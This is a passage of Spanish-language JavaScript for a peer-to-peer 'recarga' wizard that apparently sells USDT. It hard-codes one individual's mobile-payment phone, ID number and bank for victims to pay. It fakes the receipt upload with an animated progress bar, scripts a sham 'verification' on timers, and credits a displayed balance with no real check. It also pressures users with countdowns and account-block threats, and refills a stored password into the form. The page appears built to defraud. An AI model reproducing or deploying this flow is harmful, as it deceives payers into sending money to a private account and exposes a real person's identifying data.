    showModal('Cancelar recarga', body, [
        { text: 'Volver', secondary: true, action: closeModal },
        { text: 'Enviar', action: submitCancellation }
    ]);
}

function submitCancellation() {
    const select = document.getElementById('cancelReason');
    const reason = select ? select.value : '';

    closeModal();
    stopTimer();
    localStorage.removeItem(P2P_TIMER_END_KEY);

    const isFraud = reason === 'fraud';
    const blockMinutes = isFraud ? 48 * 60 : 30;
    applyTemporaryBlock(blockMinutes);

    const block = {
        type: isFraud ? 'p2p-fraud' : 'p2p-cancel',
        start: Date.now(),
        duration: blockMinutes * 60 * 1000
    };
    localStorage.setItem('accountBlock', JSON.stringify(block));

    const message = isFraud
        ? 'Por tu seguridad, tu cuenta estará bloqueada por 48 horas.'
        : 'No podrás acceder a recarga durante los próximos 30 minutos.';

    showModal('Recarga cancelada', `<p>${message}</p>`, [
        { text: 'Aceptar', action: () => { sessionStorage.clear(); window.location.href = 'homevisa.html'; } }
    ]);
}
// Copiar al portapapeles
function copyToClipboard(text) {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(text);
        showToast('success', 'Copiado al portapapeles');
    } else {
        // Fallback para navegadores antiguos
        const textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.opacity = '0';
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        showToast('success', 'Copiado al portapapeles');
    }
}

// Iniciar o reanudar timer
function startTimer() {

    // Datos fijos del pago móvil
    const bankNameEl = document.getElementById('bankName');
    if (bankNameEl) bankNameEl.textContent = 'Banco Bancamiga';
    const bankLogoEl = document.getElementById('bankLogo');
    if (bankLogoEl) {
        const logoUrl = getBankLogoByName('Bancamiga');
        bankLogoEl.src = logoUrl;
        bankLogoEl.alt = 'Banco Bancamiga';
        bankLogoEl.style.display = logoUrl ? 'inline' : 'none';
    }
    const phoneEl = document.getElementById('phoneNumber');
    if (phoneEl) {
        phoneEl.textContent = '0414-4272486';
        phoneEl.dataset.copyValue = '04144272486';
    }
    const idEl = document.getElementById('idNumber');
    if (idEl) {
        idEl.textContent = 'V 20.639785';
        idEl.dataset.copyValue = '20639785';
    }
    const conceptEl = document.getElementById('conceptCode');
    if (conceptEl) {
        conceptEl.textContent = '5484142';
        conceptEl.dataset.copyValue = '5484142';
    }
    const amountEl = document.getElementById('exactAmount');
    if (amountEl) {
        const amountNumber = AppState.selectedAmount.toFixed(2);
        const formattedAmount = amountNumber.replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.');
        amountEl.textContent = `Bs. ${formattedAmount}`;
        amountEl.dataset.copyValue = amountNumber.replace('.', '');
    }

    const now = Date.now();
    let endTime = parseInt(localStorage.getItem(P2P_TIMER_END_KEY), 10);
    if (!endTime || endTime <= now) {
        endTime = now + AppState.timerDuration * 1000;
        localStorage.setItem(P2P_TIMER_END_KEY, endTime);
    }

    AppState.timerRemaining = Math.max(0, Math.floor((endTime - now) / 1000));
    updateTimerDisplay();

    if (AppState.paymentTimer) {
        clearInterval(AppState.paymentTimer);
    }

    AppState.paymentTimer = setInterval(() => {
        const remaining = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
        AppState.timerRemaining = remaining;
        updateTimerDisplay();

        if (remaining <= 0) {
            clearInterval(AppState.paymentTimer);
            AppState.paymentTimer = null;
            localStorage.removeItem(P2P_TIMER_END_KEY);
            localStorage.setItem('p2p_current_step', 6);
            handleTimeout();
        }
    }, 1000);
}

// Detener timer
function stopTimer() {
    if (AppState.paymentTimer) {
        clearInterval(AppState.paymentTimer);
        AppState.paymentTimer = null;
    }
}

function applyTemporaryBlock(minutes) {
    const until = Date.now() + minutes * 60 * 1000;
    localStorage.setItem(P2P_BLOCK_KEY, until);
}

// Actualizar display del timer
function updateTimerDisplay() {
    const display = document.getElementById('timerDisplay');
    const progress = document.getElementById('timerProgress');
    
    const minutes = Math.floor(AppState.timerRemaining / 60);
    const seconds = AppState.timerRemaining % 60;
    
    if (display) {
        display.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
    
    if (progress) {
        const percentage = (AppState.timerRemaining / AppState.timerDuration) * 100;
        const offset = 339.292 - (339.292 * percentage) / 100;
        progress.style.strokeDashoffset = offset;
        
        // Cambiar color según el tiempo restante
        if (AppState.timerRemaining < 60) {
            progress.style.stroke = 'var(--danger)';
        } else if (AppState.timerRemaining < 300) {
            progress.style.stroke = 'var(--warning)';
        }
    }
}

// Manejar timeout
function handleTimeout() {
    showTimeoutOverlay();
}

function showTimeoutOverlay() {
    showModal('Tiempo agotado', '¿Realizaste el Pago Móvil?', [
        {
            text: 'No, cancelar',
            secondary: true,
            action: () => {
                closeModal();
                stopTimer();
                applyTemporaryBlock(30);
                localStorage.removeItem(P2P_TIMER_END_KEY);
                navigateToStep(0);
                showModal('Recarga cancelada', 'Por medidas de seguridad, tu cuenta se bloqueará temporalmente por 30 minutos.');
                const startBtn = document.getElementById('startBtn');
                if (startBtn) startBtn.disabled = true;
            }
        },
        {
            text: 'Sí, continuar',
            action: () => {
                closeModal();
                stopTimer();
                localStorage.removeItem(P2P_TIMER_END_KEY);
                navigateToStep(6);
            }
        }
    ]);
}

// Setup paso de upload
function setupUploadStep() {
    const uploadArea = document.getElementById('uploadArea');
    const fileInput = document.getElementById('fileInput');
    const removeFileBtn = document.getElementById('removeFile');
    const referenceInput = document.getElementById('referenceNumber');
    const submitBtn = document.getElementById('submitProof');
    
    // Click en área de upload
    if (uploadArea) {
        uploadArea.addEventListener('click', () => fileInput.click());
        
        // Drag and drop
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        
        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragover');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFileSelect(files[0]);
            }
        });
    }
    
    // Selección de archivo
    if (fileInput) {
        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFileSelect(e.target.files[0]);
            }
        });
    }
    
    // Eliminar archivo
    if (removeFileBtn) {
        removeFileBtn.addEventListener('click', () => {
            removeFile();
        });
    }
    
    // Referencia
    if (referenceInput) {
        referenceInput.addEventListener('input', () => {
            referenceInput.value = referenceInput.value.replace(/\D/g, '');
            AppState.referenceNumber = referenceInput.value;
            checkUploadFormValidity();
        });
    }

    // Enviar comprobante
    if (submitBtn) {
        submitBtn.addEventListener('click', () => {
            if (!validateUploadForm()) return;
            showModal(
                'Confirmación',
                'Al continuar confirmas que el comprobante que estás subiendo es auténtico y corresponde a la operación realizada. El envío de comprobantes falsos o ajenos se considera fraude y puede ocasionar la suspensión de tu cuenta.',
                [
                    { text: 'Cancelar', secondary: true, action: closeModal },
                    {
                        text: 'Acepto y enviar',
                        action: () => {
                            closeModal();
                            submitProof();
                        },
                    },
                ]
            );
        });
    }
}

// Manejar selección de archivo
function handleFileSelect(file) {
    // Validar tipo y tamaño
    const validTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    const maxSize = 5 * 1024 * 1024; // 5MB
    
    if (!validTypes.includes(file.type)) {
        showToast('error', 'Formato no válido. Usa JPG, PNG o PDF');
        return;
    }
    
    if (file.size > maxSize) {
        showToast('error', 'El archivo es muy grande. Máximo 5MB');
        return;
    }
    
    AppState.uploadedFile = file;
    displayFilePreview(file);
    checkUploadFormValidity();
}

// Mostrar preview del archivo
function displayFilePreview(file) {
    const uploadContent = document.querySelector('.upload-content');
    const uploadPreview = document.getElementById('uploadPreview');
    const previewImage = document.getElementById('previewImage');
    const fileName = document.getElementById('fileName');
    
    if (uploadContent) uploadContent.style.display = 'none';
    if (uploadPreview) uploadPreview.style.display = 'flex';
    
    if (fileName) {
        fileName.textContent = file.name;
    }
    
    // Si es imagen, mostrar preview
    if (file.type.startsWith('image/')) {
        const reader = new FileReader();
        reader.onload = (e) => {
            if (previewImage) {
                previewImage.src = e.target.result;
            }
        };
        reader.readAsDataURL(file);
    } else {
        // Para PDF, mostrar ícono
        if (previewImage) {
            previewImage.style.display = 'none';
        }
    }
}

// Eliminar archivo
function removeFile() {
    AppState.uploadedFile = null;
    
    const uploadContent = document.querySelector('.upload-content');
    const uploadPreview = document.getElementById('uploadPreview');
    const fileInput = document.getElementById('fileInput');
    
    if (uploadContent) uploadContent.style.display = 'block';
    if (uploadPreview) uploadPreview.style.display = 'none';
    if (fileInput) fileInput.value = '';
    
    checkUploadFormValidity();
}

// Verificar validez del formulario de upload
function checkUploadFormValidity() {
    const submitBtn = document.getElementById('submitProof');
    const hasFile = AppState.uploadedFile !== null;
    const hasReference = AppState.referenceNumber && AppState.referenceNumber.length >= 6;
    
    if (submitBtn) {
        submitBtn.disabled = !(hasFile && hasReference);
    }
}

// Validar formulario de upload
function validateUploadForm() {
    if (!AppState.uploadedFile) {
        showToast('error', 'Por favor, sube el comprobante de pago');
        return false;
    }
    
    if (!AppState.referenceNumber || AppState.referenceNumber.length < 6) {
        const errorEl = document.getElementById('reference-error');
        if (errorEl) {
            errorEl.textContent = 'Ingresa el número de referencia (mínimo 6 dígitos)';
        }
        return false;
    }
    
    return true;
}

// Enviar comprobante
function submitProof() {
    // Simular upload
    const progressEl = document.getElementById('uploadProgress');
    const progressFill = document.getElementById('uploadProgressFill');
    
    if (progressEl) {
        progressEl.style.display = 'block';
    }
    
    let progress = 0;
    const uploadInterval = setInterval(() => {
        progress += 10;
        if (progressFill) {
            progressFill.style.width = `${progress}%`;
        }
        
        if (progress >= 100) {
            clearInterval(uploadInterval);
            setTimeout(() => {
                navigateToStep(7);
                startVerification();
            }, 500);
        }
    }, 200);
}

// Iniciar verificación
function startVerification() {
    const checklist = document.querySelectorAll('.checklist-item');
    const verificationSteps = [
        { delay: 1000, text: 'Validando comprobante' },
        { delay: 2500, text: 'Confirmando monto' },
        { delay: 4000, text: 'Liberando USDT' },
        { delay: 5500, text: 'Activando cuenta' }
    ];
    
    verificationSteps.forEach((step, index) => {
        setTimeout(() => {
            if (checklist[index]) {
                checklist[index].classList.add('completed');
                const icon = checklist[index].querySelector('.checklist-icon svg');
                if (icon) {
                    icon.innerHTML = '<path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>';
                }
            }
        }, step.delay);
    });
    
    // Mostrar éxito
    setTimeout(() => {
        showSuccessAnimation();
    }, 7000);
}

// Mostrar animación de éxito
function showSuccessAnimation() {
    const verificationStatus = document.getElementById('verificationStatus');
    const successAnimation = document.getElementById('successAnimation');
    const finalActions = document.getElementById('finalActions');
    const receivedUsdt = document.getElementById('receivedUsdt');
    const newBalanceEl = document.getElementById('newBalance');
    const balanceCount = document.getElementById('balanceCount');

    if (verificationStatus) verificationStatus.style.display = 'none';
    if (successAnimation) {
        successAnimation.style.display = 'block';

        const coin = successAnimation.querySelector('.usdt-coin');
        const balanceAnim = successAnimation.querySelector('.balance-animation');

        if (coin) {
            coin.classList.remove('animate');
            void coin.offsetWidth;
            coin.classList.add('animate');
        }

        if (balanceAnim) {
            balanceAnim.classList.remove('animate');
            void balanceAnim.offsetWidth;
            balanceAnim.classList.add('animate');
        }
    }
    if (finalActions) finalActions.style.display = 'flex';

    const rawUsdt = EXCHANGE_RATE ? (AppState.selectedAmount / EXCHANGE_RATE) : AppState.selectedUsd;
    const usdt = Number.isFinite(rawUsdt) ? rawUsdt : AppState.selectedUsd;
    const formattedUsdt = (usdt || 0).toFixed(2);
    const newBalance = (BALANCE_USD + parseFloat(formattedUsdt)).toFixed(2);

    if (receivedUsdt) receivedUsdt.textContent = `${formattedUsdt} USDT`;
    if (newBalanceEl) newBalanceEl.textContent = `${newBalance} USDT`;
    if (balanceCount) {
        balanceCount.textContent = `${BALANCE_USD.toFixed(2)} USDT`;
        let startTime = null;
        const start = BALANCE_USD;
        const end = parseFloat(newBalance);
        function animate(timestamp) {
            if (!startTime) startTime = timestamp;
            const progress = Math.min((timestamp - startTime) / 2000, 1);
            const current = start + (end - start) * progress;
            balanceCount.textContent = `${current.toFixed(2)} USDT`;
            if (progress < 1) requestAnimationFrame(animate);
        }
        requestAnimationFrame(animate);
    }

    // Limpiar datos locales
    localStorage.removeItem('p2p_current_step');
    localStorage.removeItem('p2p_selected_amount');
    localStorage.setItem('p2pActivationCompleted', 'true');
}

// Navegar a paso
function navigateToStep(step) {
    // Validar paso
    if (step < 0 || step > AppState.maxSteps) return;

    if (step === 5) {
        const end = parseInt(localStorage.getItem(P2P_TIMER_END_KEY) || '0', 10);
        if (end && Date.now() >= end) {
            localStorage.removeItem(P2P_TIMER_END_KEY);
            localStorage.setItem('p2p_current_step', 6);
            showTimeoutOverlay();
            return;
        }
    }
    
    // Ocultar paso actual
    const currentStepEl = document.querySelector('.wizard-step.active');
    if (currentStepEl) {
        currentStepEl.classList.remove('active');
        currentStepEl.classList.add('prev');
    }
    
    // Mostrar nuevo paso
    const nextStepEl = document.getElementById(`step${step}`);
    if (nextStepEl) {
        setTimeout(() => {
            nextStepEl.classList.add('active');
            nextStepEl.classList.remove('prev');

            // Asegurar que el contenido comience desde arriba
            const content = nextStepEl.querySelector('.step-content');
            if (content) content.scrollTo(0, 0);
        }, 50);
    }
    
    // Actualizar estado
    AppState.currentStep = step;
    localStorage.setItem('p2p_current_step', step);
    
    // Actualizar UI
    updateProgress();
    updateStepIndicator();
    updateBackButton();
    
    // Manejar focus
    manageFocus(step);
    
    // Ejecutar acciones específicas del paso
    executeStepActions(step);
}

// Ejecutar acciones específicas del paso
function executeStepActions(step) {
    switch(step) {
        case 5:
            startTimer();
            break;
        case 7:
            // La verificación ya se inicia desde submitProof
            break;
    }
}

// Ir atrás
function goBack() {
    if (AppState.currentStep === 3 || AppState.currentStep === 4 || AppState.currentStep === 5) {
        showExitOverlay();
        history.pushState(null, '', window.location.href);
        return;
    }

    if (AppState.currentStep > 0) {
        // Casos especiales
        if (AppState.currentStep === 5) {
            stopTimer();
        }

        navigateToStep(AppState.currentStep - 1);
    }
}

// Actualizar progreso
function updateProgress() {
    const progressFill = document.getElementById('progressFill');
    const currentStepEl = document.getElementById('currentStep');
    
    const progress = (AppState.currentStep / AppState.maxSteps) * 100;
    
    if (progressFill) {
        progressFill.style.width = `${progress}%`;
    }
    
    if (currentStepEl) {
        currentStepEl.textContent = AppState.currentStep;
    }
}

// Actualizar indicador de paso
function updateStepIndicator() {
    const indicator = document.getElementById('stepIndicator');
    const stepNames = [
        'Introducción',
        'Registro',
        'Selección de monto',
        'Buscando operadores',
        'Operador seleccionado',
        'Instrucciones de pago',
        'Subir comprobante',
        'Verificación'
    ];
    
    if (indicator && stepNames[AppState.currentStep]) {
        indicator.textContent = stepNames[AppState.currentStep];
    }
}

// Actualizar botón atrás
function updateBackButton() {
    const backBtn = document.getElementById('backBtn');
    if (backBtn) {
        if (AppState.currentStep === 3) {
            backBtn.style.display = 'none';
        } else {
            backBtn.style.display = '';
            backBtn.disabled = AppState.currentStep === 0 || AppState.currentStep === 7;
        }
    }
}

// Gestionar focus
function manageFocus(step) {
    // Establecer focus en el primer elemento interactivo del paso
    setTimeout(() => {
        const stepEl = document.getElementById(`step${step}`);
        if (stepEl) {
            const firstInput = stepEl.querySelector('input, button:not(:disabled), [tabindex="0"]');
            if (firstInput) {
                firstInput.focus();
            }
        }
    }, 500);
}

// Llenar datos del formulario (si existen)
function fillFormData() {
    if (AppState.userData.name) {
        const nameInput = document.getElementById('userName');
        if (nameInput) {
            nameInput.value = AppState.userData.name;
            nameInput.readOnly = true;
        }
    }

    if (AppState.userData.email) {
        const emailInput = document.getElementById('userEmail');
        if (emailInput) {
            emailInput.value = AppState.userData.email;
            emailInput.readOnly = true;
        }
    }

    if (AppState.userData.password) {
        const passInput = document.getElementById('userPassword');
        if (passInput) {
            passInput.value = AppState.userData.password;
            passInput.readOnly = true;
        }
    }

    const continueBtn = document.getElementById('continueStep1');
    if (continueBtn) continueBtn.disabled = false;
}

// Mostrar toast
function showToast(type, message) {
    const container = document.getElementById('toastContainer');
    if (!container) return;
    
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    const icons = {
        success: '<path d="M20 6L9 17L4 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>',
        error: '<path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>',
        info: '<circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 16V12M12 8H12.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>'
    };
    
    toast.innerHTML = `
        <div class="toast-icon">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                ${icons[type] || icons.info}
            </svg>
        </div>
        <div class="toast-content">
            <div class="toast-message">${message}</div>
        </div>
    `;
    
    container.appendChild(toast);
    
    // Anunciar para lectores de pantalla
    toast.setAttribute('role', 'status');
    toast.setAttribute('aria-live', 'polite');
    
    // Eliminar después de 3 segundos
    setTimeout(() => {
        toast.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => {
            toast.remove();
        }, 300);
    }, 3000);
}

// Mostrar modal
function showModal(title, body, actions = []) {
    const overlay = document.getElementById('modalOverlay');
    const modalTitle = document.getElementById('modalTitle');
    const modalBody = document.getElementById('modalBody');
    const modalFooter = document.getElementById('modalFooter');

    if (modalTitle) modalTitle.textContent = title;
    if (modalBody) {
        if (typeof body === 'string') {
            modalBody.innerHTML = body;
        } else {
            modalBody.innerHTML = '';
            modalBody.appendChild(body);
        }
    }
    
    if (modalFooter) {
        modalFooter.innerHTML = '';
        actions.forEach(action => {
            const btn = document.createElement('button');
            btn.className = action.secondary ? 'btn btn-secondary' : 'btn btn-primary';
            btn.textContent = action.text;
            btn.addEventListener('click', action.action);
            modalFooter.appendChild(btn);
        });
    }
    
    if (overlay) {
        overlay.classList.add('active');
        
        // Focus management
        const modal = overlay.querySelector('.modal');
        if (modal) {
            const focusableElements = modal.querySelectorAll('button, [tabindex]:not([tabindex="-1"])');
            if (focusableElements.length > 0) {
                focusableElements[0].focus();
            }
        }
    }
}

// Cerrar modal
function closeModal() {
    const overlay = document.getElementById('modalOverlay');
    if (overlay) {
        overlay.classList.remove('active');
    }
}

// Event listener para cerrar modal
document.getElementById('modalClose')?.addEventListener('click', closeModal);
document.getElementById('modalOverlay')?.addEventListener('click', (e) => {
    if (e.target.id === 'modalOverlay') {
        closeModal();
    }
});

// Prevenir navegación accidental
window.addEventListener('beforeunload', (e) => {
    if (AppState.currentStep > 0 && AppState.currentStep < 7) {
        e.preventDefault();
        e.returnValue = '';
    }
});

// Log de inicialización
console.log('Aplicación P2P inicializada correctamente');
